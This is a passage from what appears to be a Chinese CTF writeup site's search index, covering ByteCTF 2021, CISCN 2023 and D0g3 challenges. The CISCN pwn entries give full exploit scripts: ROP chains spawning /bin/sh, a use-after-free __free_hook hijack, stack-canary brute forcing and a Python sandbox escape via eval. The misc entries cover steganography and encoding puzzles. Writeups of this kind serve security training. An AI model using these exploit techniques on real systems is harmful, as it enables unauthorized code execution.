\u4e2d\u770b\u5230\u4e0b\u56fe</p> <p></p> <p>\u7136\u540e\u83b7\u53d6 red 0 \u548c blue 0</p> <p></p> <p></p> <p>\u611f\u89c9\u5f88\u50cf\uff0c\u5f02\u6216\u4e00\u4e0b\u5f97\u5230\u4e0b\u56fe</p> <p></p> <p>\u6839\u636e hint\uff0c\u731c\u6d4b\u662f\u4f7f\u7528 Arnold's Cat Map \u8fdb\u884c\u53d8\u6362\uff0c\u518d\u6839\u636e green 0 \u4e2d\u7684\u6570\u5b57\u53d6 Cat Map \u53c2\u6570</p> <pre><code>import os\n\nfrom PIL.Image import open as load_pic, new as new_pic\n\ndef main(path, iterations, name=\"arnold_cat-{name}-{index}.png\"):\n    title = os.path.splitext(os.path.split(path)[1])[0]\n    ppath=path\n    counter = 0\n    while counter &lt; iterations:\n        with load_pic(path) as image:\n            dim = width, height = image.size\n            with new_pic(image.mode, dim) as canvas:\n                for x in range(width):\n                    for y in range(height):\n                        nx = (1 * x + 20 * y) % width\n                        ny = (21 * x + 421 * y) % height\n                        canvas.putpixel((nx, height-ny-1), image.getpixel((x, height-y-1)))\n        counter += 1\n        print(counter, end=\"\\r\")\n        path = name.format(name=title, index=counter)\n        canvas.save(path)\n\n    return canvas\n\nresult = main(\"233.bmp\", 384)\nresult.show()\n</code></pre> <p>\u7b2c\u4e00\u5f20\u56fe\u5c31\u662f</p> <p></p>"}, {"location": "writeups/bytectf2021_final/#undercover", "title": "Undercover", "text": "<p>\u62ff\u5230\u9898\u76ee\u53d1\u73b0\u7ed9\u9898\u7684\u65b9\u5f0f\u4e0d\u662f\u53d1\u9644\u4ef6\u800c\u662f\u76f4\u63a5\u63d2\u5165\u56fe\u7247\uff0c\u6240\u4ee5\u8003\u8651\u662f\u4e0d\u662f\u548c\u94fe\u63a5\u6709\u5173\u7cfb\uff1a</p> <pre><code>https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-imagexlite-0bb543cf5d800a1a226c9d1fe716be95.png\n</code></pre> <p>\u53d1\u73b0\u4e86 <code>~tplv-</code> \uff0c\u6240\u4ee5\u4e0a\u56fe\u5e94\u8be5\u662f\u4f7f\u7528 velmageX \u7528\u5904\u7406\u6a21\u677f\u5904\u7406\u8fc7\u7684\uff0c\u6240\u4ee5\u5c31\u76f4\u63a5\u5220\u6389\u5904\u7406\uff0c\u5f97\u5230\u539f\u59cb\u56fe\u7247\u7684\u5730\u5740\uff1a</p> <pre><code>https://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~tplv-yykgsuqxec-image.png\n\u6216\nhttps://p3.toutiaoimg.com/img/tos-cn-i-qvj2lq49k0/7a19b5d53d014130ab3c00f73a8d4645~noop.png\n</code></pre> <p>\u518d\u6839\u636e hint\uff1aOriginal image have exif\uff0c\u67e5\u770b\u8fd9\u4e2a\u56fe\u7247\u7684 exif\uff0c\u53d1\u73b0\u6709 Author \u4e00\u9879\uff1a<code>Author: From: Zach Oakes</code></p> <p>\u641c\u7d22 Zach Oakes \u53d1\u73b0\u4ed6\u5199\u7684\u4e00\u4e2a\u9690\u5199\u5de5\u5177\uff1ahttps://sekao.net/pixeljihad/</p> <p>\u628a\u8fd9\u5f20\u56fe\u7247\u4f20\u5165\u62ff\u5230 flag\uff1a</p> <p></p>"}, {"location": "writeups/ciscn2023/", "title": "CISCN 2023 Quals Writeup", "text": "<p> \u7ea6 1032 \u4e2a\u5b57  235 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Abstract</p> <p>\u7b2c\u4e00\u6b21\u6253\u56fd\u8d5b\uff0cmisc \u592a\u70c2\u4e86\uff0c\u4e8e\u662f\u505a\u4e86\u4e24\u5929 pwn\uff0c\u8fd8\u633a\u597d\u73a9\u7684\u3002</p>"}, {"location": "writeups/ciscn2023/#_1", "title": "\u70e7\u70e4\u644a\u513f", "text": "<p>\u9759\u6001\u94fe\u63a5\uff0c\u6ca1\u6709 PIE\u3002</p> <p>main \u51fd\u6570\u4e2d\u8c03\u7528 menu\uff0c\u8fd4\u56de\u7528\u6237\u9009\u9879\uff0c\u7136\u540e\u901a\u8fc7\u51fd\u6570\u5730\u5740\u504f\u79fb\u5f97\u5230\u6267\u884c\u7684\u51fd\u6570 pijiu\u3001chuan\u3001yue\u3001vip\u3001gaiming \u7b49\u3002</p> <p>gaiming \u4e2d scanf \u5b58\u5728\u6808\u6ea2\u51fa\uff0c\u800c\u6539\u540d\u9700\u8981\u4e70\u4e0b\u644a\u5b50\uff0c\u82b1\u8d39 100000\u3002</p> <p>\u9006\u5411 pijiu \u53d1\u73b0\u8f93\u5165\u7684\u8d2d\u4e70\u74f6\u6570\u662f signed int\uff0c\u6240\u4ee5\u53ea\u8981\u8fd9\u91cc\u8f93\u5165\u8d1f\u6570\u5c31\u53ef\u4ee5\u589e\u52a0\u94b1\u3002</p> <p>\u4e70\u4e0b\u644a\u5b50\u540e\u901a\u8fc7 gaiming \u4e2d\u7684\u6808\u6ea2\u51fa\u8fdb\u884c ROP \u5373\u53ef\uff0c\u76f4\u63a5\u8c03\u7528 syscall \u6267\u884c /bin/sh\uff0c/bin/sh \u53ef\u4ee5\u901a\u8fc7 gaiming \u4e2d\u7684 strcpy \u62f7\u8d1d\u5230 name \u4e2d\u3002</p> exp <pre><code>p.sendlineafter(b\"&gt; \", b\"1\")\n[p.recvline() for i in range(3)]\np.sendline(b\"1\")\np.sendlineafter(b\"\\n\", b\"-1000000\")\np.sendlineafter(b\"&gt; \", b\"4\")\n\n# gaiming stack\n\"\"\"\ngaiming stack:\n00:0000\u2502 rsp\n01:0008\u2502 \n02:0010\u2502 \n03:0018\u2502 \n04:0020\u2502 rbp\n05:0028\u2502 ret addr\n\"\"\"\n\n\"\"\"\n0x0000000000402404 : syscall\n0x000000000040264f : pop rdi ; ret\n0x0000000000458827 : pop rax ; ret\n0x000000000040a67e : pop rsi ; ret\n0x00000000004a404a : pop rax ; pop rdx ; pop rbx ; ret\n\"\"\"\n\n# syscall(rdi: &amp;\"/bin/sh\", rax: 59, rsi: 0, rdx: 0)\npayload = b\"/bin/sh\\x00\"\npayload += b\"AAAAAAAA\"\npayload += b\"AAAAAAAA\"\npayload += b\"AAAAAAAA\"\npayload += b\"AAAAAAAA\" # fill stack\npayload += p64(0x40264f) # pop rdi ; ret\npayload += p64(0x4e60f0) # name\npayload += p64(0x4a404a) # pop rax ; pop rdx ; pop rbx ; ret\npayload += p64(59)\npayload += p64(0)\npayload += p64(0)\npayload += p64(0x40a67e) # pop rsi ; ret\npayload += p64(0)\npayload += p64(0x402404) # syscall\n\np.sendlineafter(b\"&gt; \", b\"5\")\np.sendlineafter(b\"\\n\", payload)\n\np.interactive()\n</code></pre>"}, {"location": "writeups/ciscn2023/#strangetalkbot", "title": "StrangeTalkBot", "text": "<p>\u9006\u5411\u7a0b\u5e8f\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e9b BINARYBF-c.c \u4e4b\u7c7b\u7684\uff0c\u914d\u5408 assert \u641c\u7d22\u53ef\u4ee5\u77e5\u9053\u662f\u4f7f\u7528\u4e86 protobuf\uff0cmain \u51fd\u6570\u4e2d\u8c03\u7528\u7684 sub_192D \u51fd\u6570\u5c31\u662f\u8fdb\u884c protobuf \u6d88\u606f\u7684\u89e3\u6790\uff0c\u7136\u540e\u5c06\u5f97\u5230\u7684 v4[4:9] \u4f20\u5165\u4e86 sub_155D \u8fdb\u884c\u5206\u7c7b\u5904\u7406\uff0c\u8fd9\u90e8\u5206\u53c2\u6570\u5c31\u662f\u7528\u6237\u8f93\u5165\u7684 protobuf message \u7ed3\u6784\u3002</p> <p>\u901a\u8fc7 sub_155D \u53ef\u4ee5\u77e5\u9053\u4e00\u5171\u6709\u56db\u79cd\u64cd\u4f5c\uff0c\u5bf9\u4e00\u7cfb\u5217\u5806\u8fdb\u884c\u64cd\u4f5c\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570 int64 \u5c31\u662f\u9009\u62e9\u64cd\u4f5c\u3002\u6808\u4e0a\u4fdd\u5b58\u4e00\u4e2a base_addr \u8bb0\u5f55\u591a\u4e2a malloc \u5206\u914d\u7684\u5730\u5740\uff0c\u4f20\u5165\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5806\u7684\u7d22\u5f15\u3002\u7b2c\u4e09\u548c\u7b2c\u56db\u4e2a\u53c2\u6570\u548c\u8d77\u6765\u662f\u4e00\u4e2a bytes \u5e8f\u5217\uff08\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u8fd9\u4e2a\u5e8f\u5217\u7684\u957f\u5ea6\uff09\u6240\u4ee5\u4ea4\u4e92\u9700\u8981\u7684 protobuf \u7ed3\u6784\uff1a</p> <pre><code>syntax = \"proto3\";\n\nmessage Msg {\n    int64 id = 1;\n    int64 idx = 2;\n    int64 size = 3;\n    bytes buf = 4;\n}\n</code></pre> <p>\u4e00\u4e9b\u9650\u5236\uff1a\u53ea\u80fd\u521b\u5efa 0x20 \u4e2a\u5806\uff0c\u5806\u7684\u5927\u5c0f/bytes \u5e8f\u5217\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7 0xf0\u3002</p> <p>\u56db\u4e2a\u64cd\u4f5c\uff1a</p> <ul> <li>1 - create\uff1a\u5982\u679c base+i \u5904\u6ca1\u6709\u8bb0\u5f55\u5206\u914d\u7684\u5730\u5740\uff0c\u5219\u65b0 malloc \u4e00\u4e2a\uff0c\u5927\u5c0f\u4e3a size \u548c buf \u957f\u5ea6\u7684\u6700\u5927\u503c\uff0c\u7136\u540e\u5c06 buf \u4e2d\u5185\u5bb9\u62f7\u8d1d\u8fc7\u53bb</li> <li>2 - update\uff1a\u66f4\u65b0 base+i \u6307\u5411\u7684\u5806\u7684\u5185\u5bb9\uff0c\u62f7\u8d1d buf \u5185\u5bb9\u8fc7\u53bb\uff08\u957f\u5ea6\u8d85\u8fc7\u539f\u5927\u5c0f\u4f1a\u622a\u65ad\uff09</li> <li>3 - print\uff1a\u5c06 base+i \u6307\u5411\u7684\u5806\u7684\u5185\u5bb9\u5168\u90e8\u8f93\u51fa\u5230 stdout</li> <li>4 - delete\uff1afree \u6389 base+i \u6307\u5411\u7684\u5806\uff0c\u4f46\u4e0d\u6e05\u7a7a base+i \u5904\u8bb0\u5f55\u7684\u6307\u9488</li> </ul> <p>\u7531\u4e8e free \u7684\u65f6\u5019\u6307\u9488\u4ecd\u7559\u7740\uff0c\u6240\u4ee5\u5b58\u5728 UAF\u3002\u601d\u8def\uff1a</p> <ul> <li>\u5148\u901a\u8fc7\u989d\u5916\u4e03\u4e2a\u5806\u7ed5\u8fc7 tcache\uff0c\u63a5\u7740 free \u4e00\u4e2a\u5806\u5230 unordered bin\uff0c\u4ece\u800c\u901a\u8fc7 fd bk leak \u5f97\u5230 libc \u57fa\u5740</li> <li>\u7136\u540e\u5229\u7528 UAF \u4fee\u6539 tcache bin \u4e2d\u7684 fd \u4f7f\u5f97\u91cd\u65b0 malloc \u56de\u6765\u7684\u5730\u5740\u53d8\u4e3a __free_hook</li> <li>\u6700\u540e\u5728 __free_hook \u7684\u5730\u65b9\u8fc1\u79fb\u6808\u5e76 ROP \u5bf9 flag \u8fdb\u884c open read write \u5373\u53ef</li> </ul> exp <pre><code>from exp_pb2 import *\n\n...\n\ndef send(_id, idx, size, buf):\n    msg = Msg()\n    msg.id = _id &lt;&lt; 1\n    msg.idx = idx &lt;&lt; 1\n    msg.size = size &lt;&lt; 1\n    msg.buf = buf\n    return msg.SerializeToString()\n\ndef create(idx, size, content):\n    p.sendafter(b\": \\n\", send(1, idx, size, content))\n\ndef update(idx, content):\n    p.sendafter(b\": \\n\", send(2, idx, 0xf0, content))\n\ndef print_(idx):\n    p.sendafter(b\": \\n\", send(3, idx, 3, b\"AAA\"))\n\ndef delete(idx):\n    p.sendafter(b\": \\n\", send(4, idx, 3, b\"AAA\"))\n\nfor i in range(1, 9):\n    create(i, 0x80, b\"AAA\")\npause()\n\nfor i in range(8, 0, -1):\n    delete(i)\npause()\n\nprint_(1)\np.recvn(0x70)\nlibc.address = u64(p.recvn(0x8)) - 0x1ECBE0\n\ncreate(10, 0xf0, b\"AAA\")\ncreate(11, 0xf0, b\"AAA\")\ndelete(11)\ndelete(10)\nupdate(10, p64(libc.sym['__free_hook']))\ncreate(12, 0xf0, p64(0) + p64(libc.sym['__free_hook'] + 0x10))\ncreate(13, 0xf0, b\"a\")\n\n\"\"\"\n0x0000000000047445 : add rsp, 0x28 ; ret\n0x000000000005b4d0 : mov rsp, rdx ; ret\n0x0000000000023b6a : pop rdi ; ret\n0x000000000002601f : pop rsi ; ret\n0x0000000000142c92 : pop rdx ; ret\n0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]\n\"\"\"\n\nadd_rsp_ret = libc.address + 0x47445\nmov_rsp_rdx_ret = libc.address + 0x5b4d0\npop_rdi_ret = libc.address + 0x23b6a\npop_rsi_ret = libc.address + 0x2601f\npop_rdx_ret = libc.address + 0x142c92\ngadget = libc.address + 0x151990\n\npayload  = p64(gadget)\npayload += p64(libc.sym[\"__free_hook\"] + 0x10)\npayload += p64(add_rsp_ret)\npayload += p64(0)\npayload += p64(0)\npayload += p64(0)\npayload += p64(mov_rsp_rdx_ret)\npayload += p64(0)\npayload += p64(pop_rdi_ret)\npayload += p64(libc.sym[\"__free_hook\"] + 0xc0)\npayload += p64(pop_rsi_ret)\npayload += p64(0)\npayload += p64(libc.sym[\"open\"])\npayload += p64(pop_rdi_ret)\npayload += p64(3)\npayload += p64(pop_rsi_ret)\npayload += p64(libc.sym[\"__free_hook\"] - 0x100)\npayload += p64(pop_rdx_ret)\npayload += p64(0x100)\npayload += p64(libc.sym[\"read\"])\npayload += p64(pop_rdi_ret)\npayload += p64(libc.sym[\"__free_hook\"] - 0x100)\npayload += p64(libc.sym[\"puts\"])\npayload += p64(0)\npayload += b\"./flag\\x00\"\n\nupdate(13, payload)\ndelete(12)\n\np.interactive()\n</code></pre>"}, {"location": "writeups/ciscn2023/#funcanary", "title": "funcanary", "text": "<p>\u4e00\u4e2a\u4e0d\u65ad fork \u7684\u7a0b\u5e8f\uff0c\u56e0\u4e3a fork \u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\u62f7\u8d1d\u5168\u90e8\u5185\u5b58\uff0c\u6240\u4ee5 canary \u4e0d\u4f1a\u53d8\uff0c\u51fd\u6570\u5730\u5740\u4e5f\u90fd\u4e0d\u4f1a\u53d8\u3002</p> <p>\u6240\u4ee5\u9010\u5b57\u8282\u7206\u7834 canary\uff0c\u7136\u540e\u7206\u7834\u8986\u76d6\u8fd4\u56de\u5730\u5740\u672b\u5c3e\uff0c\u76f4\u5230\u6b63\u786e\u8dd1\u5230\u540e\u95e8\u5730\u5740\u4e3a\u6b62\uff1a</p> exp <pre><code>canary = b\"\\x00\"\n\np.recv()\n\nfor i in range(7):\n    for j in range(256):\n        payload = b\"A\" * 0x68 + canary + p8(j)\n        p.send(payload)\n        p.recvline()\n        res = p.recvline()\n        if b\"stack smashing\" not in res:\n            info(f\"canary[{i}] = {hex(j)}\")\n            canary += p8(j)\n            break\n    assert(len(canary) == i + 2)\n\nsuccess(f\"canary = {canary}\")\n\ncontext.log_level = \"debug\"\n\nfor j in range(0x100):\n    payload = b\"A\" * 0x68 + canary + b\"A\" * 8 + p8(0x2E) + p8(j)\n    p.send(payload)\n    res = p.recv()\n    if b\"flag\" in res:\n        print(res)\n        break\n</code></pre>"}, {"location": "writeups/ciscn2023/#shell-we-go", "title": "Shell We Go", "text": "<p>go \u9006\u5411\uff0c\u901a\u8fc7\u641c\u7d22\u5173\u952e\u5b57\u7b26\u4e32\uff0c\u77e5\u9053\u51fd\u6570 sub_4C1900 \u5904\u4e3a\u5904\u7406\u547d\u4ee4\u7684\u51fd\u6570\uff0c\u5176\u4e2d\u8ddf\u7740 cert \u547d\u4ee4\u53ef\u4ee5\u77e5\u9053\u63a5\u4e0b\u6765\u9700\u8981\u8f93\u5165 nAcDsMicN \u7136\u540e\u5269\u4f59\u5185\u5bb9\u5728 sub_4C14A0 \u51fd\u6570\u4e2d\u8fdb\u884c\u5224\u65ad\u3002</p> <p>\u6839\u636e IDA finger \u7684\u89e3\u6790\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e2d\u5148\u5bf9\u8f93\u5165\u8fdb\u884c\u4e86 rc4 \u52a0\u5bc6\uff0c\u5bc6\u94a5\u4e3a F1nallB1rd3K3y\uff0c\u7136\u540e\u5bf9\u7ed3\u679c Base64 \u540e\u4e0e JLIX8pbSvYZu/WaG \u6bd4\u8f83\uff0c\u8fd4\u56de\u6765\u5373\u53ef\u5f97\u5230 cert \u8ba4\u8bc1\u7684\u5185\u5bb9 <code>S33UAga1n@#!</code></p> <p>\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u8fdb\u884c shell \u64cd\u4f5c\uff0cls \u76f4\u63a5\u8c03\u7528 os\uff0ccd \u76f4\u63a5\u8c03\u7528 os.chdir\uff0ccat \u7981\u6b62\uff0ccat flag \u8f93\u51fa\u5047 flag\uff0cwhoami \u76f4\u63a5\u8f93\u51fa nightingale\uff0cexit \u9000\u51fa\uff0c\u53ea\u6709 echo \u5148\u8f93\u5165\u540e\u8f93\u51fa\uff0c\u6d4b\u8bd5\u5f97\u77e5\u4f1a\u5b58\u5728\u6808\u6ea2\u3002\u800c\u4e14\u6839\u636e\u9006\u5411\uff0c\u9700\u8981\u5148\u7528 0x200 \u4e2a + \u586b\u6ee1 buffer\uff0c\u4e0b\u4e00\u4e2a\u53c2\u6570\u4e2d\u518d\u8fdb\u884c\u8fd4\u56de\u5730\u5740\u7684\u8986\u76d6\u3002</p> <p>\u8c03\u8bd5\u5f97\u77e5\u53ef\u4ee5\u8fdb\u884c\u8fd4\u56de\u5730\u5740\u7684\u8986\u76d6\uff0c\u6240\u4ee5\u8fdb\u884c ROP \u5373\u53ef\uff0c\u56e0\u4e3a flag \u5b57\u7b26\u4e32\u5728\u7a0b\u5e8f\u4e2d\u591a\u6b21\u51fa\u73b0\uff0c\u6240\u4ee5 open read write \u5373\u53ef\u3002</p> exp <pre><code>p.sendlineafter(b\"$ \", b\"cert nAcDsMicN S33UAga1n@#!\")\n# p.interactive()\n\n\"\"\"\n0x000000000040d9e6 : pop rax ; ret\n0x0000000000444fec : pop rdi ; ret\n0x000000000041e818 : pop rsi ; ret\n0x000000000049e11d : pop rdx ; ret\n0x000000000040328c : syscall\n\"\"\"\n\npop_rax_ret = 0x40d9e6\npop_rdi_ret = 0x444fec\npop_rsi_ret = 0x41e818\npop_rdx_ret = 0x49e11d\nsyscall = 0x40328c\nsyscall_ret = 0x4636e9\nflag_str = 0x4c34c8\ndata_buf = 0x59be00\n\npayload = b\"echo \" + b\"+\" * 0x200 + b\" \" + b\"a\" * 4\n\npayload += p64(pop_rax_ret)\npayload += p64(2)\npayload += p64(pop_rdi_ret)\npayload += p64(flag_str)\npayload += p64(pop_rsi_ret)\npayload += p64(0)\npayload += p64(syscall_ret)\n\npayload += p64(pop_rax_ret)\npayload += p64(0)\npayload += p64(pop_rdi_ret)\npayload += p64(3)\npayload += p64(pop_rsi_ret)\npayload += p64(data_buf)\npayload += p64(pop_rdx_ret)\npayload += p64(0x100)\npayload += p64(syscall_ret)\n\npayload += p64(pop_rax_ret)\npayload += p64(1)\npayload += p64(pop_rdi_ret)\npayload += p64(1)\npayload += p64(pop_rsi_ret)\npayload += p64(data_buf)\npayload += p64(pop_rdx_ret)\npayload += p64(0x100)\npayload += p64(syscall_ret)\n\npayload += b\"A\" * 16 + b\"A\" * (0x100 - 23 * 8)\n\ninfo(payload)\n\n# payload += b\"A\" * 0x40\n\np.sendlineafter(b\"# \", payload)\np.interactive()\n</code></pre>"}, {"location": "writeups/ciscn2023/#_2", "title": "\u88ab\u52a0\u5bc6\u7684\u751f\u4ea7\u6d41\u91cf", "text": "<p>modbus TCP \u6d41\u91cf\uff0c\u76f4\u63a5 wireshark \u8ffd\u8e2a TCP \u6d41\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u4e00\u90e8\u5206\u5ba2\u6237\u7aef\u6d41\u91cf\u6bcf\u6b21\u672b\u5c3e\u90fd\u6709\u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u62fc\u5230\u4e00\u8d77\uff1a</p> <p>MMYWMX3GNEYWOXZRGAYDA===</p> <p>Base32 \u7f16\u7801\uff0c\u89e3\u7801\u5f97\u5230 c1f_fi1g_1000\uff0c\u5305\u4e0a flag{} \u5373 flag\u3002</p>"}, {"location": "writeups/ciscn2023/#pyshell", "title": "pyshell", "text": "<p>\u901a\u8fc7\u5c1d\u8bd5\u5f97\u77e5\u6c99\u7bb1\u9650\u5236\u7684\u662f\u6bcf\u6b21\u8f93\u5165\u7684\u957f\u5ea6\u3002</p> <p>\u6240\u4ee5\u4f7f\u7528 python shell \u6bcf\u6b21\u7ed3\u679c\u4f5c\u4e3a _ \u53d8\u91cf\u7684\u503c\u7684\u7279\u6027\u8fdb\u884c\u62fc\u63a5\u4ee5\u53ca eval \u5373\u53ef\uff1a</p> <pre><code>'open('\n_+'\"/f'\n_+'lag'\n_+'\").'\n_+'rea'\n_+'d()'\neval(_)\n</code></pre>"}, {"location": "writeups/d0g3/", "title": "\u7b2c\u56db\u5c4a\u201c\u5b89\u6d35\u676f\u201d\u7f51\u7edc\u5b89\u5168\u6311\u6218\u8d5b Writeup", "text": "<p> \u7ea6 404 \u4e2a\u5b57  81 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u8fd9\u6b21\u7684 misc \u7b97\u662f\u505a\u5f97\u6bd4\u8f83\u597d\uff0c\u4e0b\u9762\u662f writeup</p>"}, {"location": "writeups/d0g3/#cthulhu-mythos", "title": "Cthulhu Mythos", "text": "<p>hint.mp3 \u5f00\u5934\u662f\u300aOverworld Day\u300b\u6cf0\u62c9\u745e\u4e9aOST</p> <p>\u540e\u9762\u662fSSTV\uff0cScottie1\u6a21\u5f0f\u3002\u5f97\u5230\u56fe\u7247\uff1a</p> <p></p> <pre><code>MRPVI4TZL5KGK4TSGRZGSYJBPU======\n</code></pre> <p>Base32 \u89e3\u7801\uff1a<code>d_Try_Terr4ria!}</code> </p> <p>\u4ece\u56fe\u7247\u4e5f\u80fd\u770b\u51fa\u8fd9\u662f\u4e00\u4e2a Base32 \u7684\u540e\u534a\u90e8\u5206\uff0c\u9700\u8981\u627e\u524d\u9762\u7684\u4e00\u622a</p> <p>\u7136\u540e\u6253\u5f00\u90a3\u4e2awld\u6587\u4ef6\uff1a</p> <p></p> <p><code>7I4YF6QLO</code></p> <p>\u4ed4\u7ec6\u627e\u8fd8\u53ef\u4ee5\u53d1\u73b0\u56db\u4e2a\u7bb1\u5b50\uff1a</p> \u7bb1\u5b50 <p></p> <p></p> <p></p> <p></p> <p>3\u6761\u62fc\u5728\u4e00\u8d77\u662f\u5b8c\u6574\u7684 Base32</p> <p><code>IQYGOM33JUYW4ZLDKI2GM5C7I4YF6QLOMRPVI4TZL5KGK4TSGRZGSYJBPU======</code></p> <p>Base32\uff1a<code>D0g3{M1necR4ft_G0_And_Try_Terr4ria!}</code> </p>"}, {"location": "writeups/d0g3/#lovemath", "title": "lovemath", "text": "<p>\u6839\u636e\u9898\u5e72\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8981\u7528\u5230 Tupper's Self-Referential Formula</p> <p>\u5148\u770b\u538b\u7f29\u5305</p> <p></p> <p>flag\u649eCRC\u6821\u9a8c</p> <p>\u5bc6\u7801: <code>th1s_Is_Y0ur_pa33w0rd_We1c0m3e</code></p> <p>\u89e3\u538b\u51fa\u6765\u7684\u56fe\u7247:</p> <p></p> <p>\u8fd9\u4e2a\u4e22\u8fdb stegsolve \u540e red 0 \u6bd4\u8f83\u8be1\u5f02\uff0c\u6240\u4ee5\u7528 LSB \u9690\u5199\u8bd5\u8bd5</p> <p></p> <p></p> <p>\u5220\u6389\u5f00\u5934\u7684\u810f\u6570\u636e\u5f97\u5230\uff1a</p> <p></p> <p>\u8fd9\u4e2a\u8f6c\u6587\u5b57\u8f93\u5230 Tupper's Self-Referential Formula \u7684\u5728\u7ebf\u7f51\u7ad9 https://tuppers-formula.ovh/ \u91cc</p> <pre><code>1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352\n</code></pre> <p></p> <p><code>D0g3{I_LOV3_math}</code></p>"}, {"location": "writeups/d0g3/#cyzcc_loves_lol", "title": "CyzCC_loves_LOL", "text": "<p>\u5f00\u59cb\u662f LOLcode\uff0c\u8f6c\u6362\u5f97\u5230\u538b\u7f29\u5305\u5bc6\u7801 <code>AGdJfpqebmXpptloa</code></p> <p>\u5f97\u5230\u4e24\u5f20\u56fe\u7247\uff0c\u4e00\u5f20\u540d\u5b57\u662f <code>jinx's_flag_in_silent.jpg</code> \u63a8\u6d4b\u662f\u7528\u4e86 SilentEye \u8fd9\u4e2a\u8f6f\u4ef6\u85cf\u4e86 flag\uff0c\u9700\u8981\u4e00\u4e2a\u5bc6\u7801</p> <p>\u7b2c\u4e8c\u4e2a\u56fe\u7247\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u50cf\u7d20\u56fe\uff0c\u8f93\u51fa\u4e86\u4e00\u4e0b\uff0c\u989c\u8272\u4e00\u5171\u6709 10 \u79cd\uff1a <pre><code>#800000FF\n#008000FF\n#000000FF\n#0000FFFF\n#FFFF00FF\n#00FFFFFF\n#FF0000FF\n#00FF00FF\n#008080FF\n#808000FF\n</code></pre></p> <p>\u6240\u4ee5\u5e94\u8be5\u662f Brainloller \u800c\u4e0d\u662f Piet\uff0c\u4ece\u5728\u7ebf\u7f51\u7ad9 https://minond.xyz/brainloller/ \u6216\u8005\u5199\u4ee3\u7801\u53ef\u4ee5\u8f6c\u6362\u5f97\u5230 brainfuck \u4ee3\u7801 </p> Brainloller\u89e3\u91ca\u5668 <pre><code>from PIL import Image \nimport sys\n\ndef Brainloller(filename):\n    source = Image.open(filename).convert(\"RGB\")\n    width, height = source.size\n    result = ''\n    ptr = (0, 0)\n    direction = 0\n    while True:\n        if ptr[0] &gt;= height or ptr[0] &lt; 0 or ptr[1] &gt;= width or ptr[1] &lt; 0:\n            break\n        else:\n            color = source.getpixel((ptr[1], ptr[0]))\n            if   color == (255,   0,   0): result += '&gt;'\n            elif color == (128,   0,   0): result += '&lt;'\n            elif color == (  0, 255,   0): result += '+'\n            elif color == (  0, 128,   0): result += '-'\n            elif color == (  0,   0, 255): result += '.'\n            elif color == (  0,   0, 128): result += ','\n            elif color == (255, 255,   0): result += '['\n            elif color == (128, 128,   0): result += ']'\n            elif color == (  0, 255, 255): direction = (direction + 1) % 4\n            elif color == (  0, 128, 128): direction = (direction - 1) % 4\n            else: print(f\"[-] Unknown color: {color}\")\n        if   direction == 0: ptr = ptr[0], ptr[1] + 1\n        elif direction == 1: ptr = ptr[0] + 1, ptr[1]\n        elif direction == 2: ptr = ptr[0], ptr[1] - 1\n        elif direction == 3: ptr = ptr[0] - 1, ptr[1]\n\n    print(f\"[+] BrainFuck Code: {result}\")\n    return result\n\ndef Brainfuck(code):\n    code = ''.join(filter(lambda x: x in ['.', ',', '[', ']', '&lt;', '&gt;', '+', '-'], code))\n    bracemap = buildbracemap(code)\n\n    cells, codeptr, cellptr = [0], 0, 0\n    result = ''\n\n    while codeptr &lt; len(code):\n        command = code[codeptr]\n        if command == \"&gt;\":\n            cellptr += 1\n            if cellptr == len(cells): cells.append(0)\n        elif command == \"&lt;\": cellptr = 0 if cellptr &lt;= 0 else cellptr - 1\n        elif command == \"+\": cells[cellptr] = cells[cellptr] + 1 if cells[cellptr] &lt; 255 else 0\n        elif command == \"-\": cells[cellptr] = cells[cellptr] - 1 if cells[cellptr] &gt; 0 else 255\n        elif command == \"[\" and cells[cellptr] == 0: codeptr = bracemap[codeptr]\n        elif command == \"]\" and cells[cellptr] != 0: codeptr = bracemap[codeptr]\n        elif command == \".\": result += chr(cells[cellptr])\n        elif command == \",\": cells[cellptr] = ord(input(\"[*] input one char &gt; \"))\n        codeptr += 1\n\n    print(f\"[+] Result: {result}\")\n\ndef buildbracemap(code):\n    temp_bracestack, bracemap = [], {}\n    for position, command in enumerate(code):\n        if command == \"[\": temp_bracestack.append(position)\n        if command == \"]\":\n            start = temp_bracestack.pop()\n            bracemap[start] = position\n            bracemap[position] = start\n    return bracemap\n\nif __name__ == \"__main__\":\n    Brainfuck(Brainloller(sys.argv[1]))\n</code></pre> <pre><code>-+++++++-+[&lt;++++++++&gt;-]&lt;.&gt;+++++++[&lt;++++&gt;-]&lt;+.+++++++..+++.&gt;&gt;&gt;++++++++[&lt;++++&gt;-]&lt;.&gt;&gt;&gt;++++++++++[&lt;++++-++++&gt;-]&lt;---.&lt;&lt;&lt;&lt;.+++.-+----.--------.&gt;&gt;+.\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\u5b83\u5728\u524d\u9762\u4f1a\u628a\u6307\u9488\u5de6\u79fb\u4e00\u4f4d\uff0c\u6240\u4ee5\u9700\u8981\u628a bf \u89e3\u91ca\u5668\u7684 cell 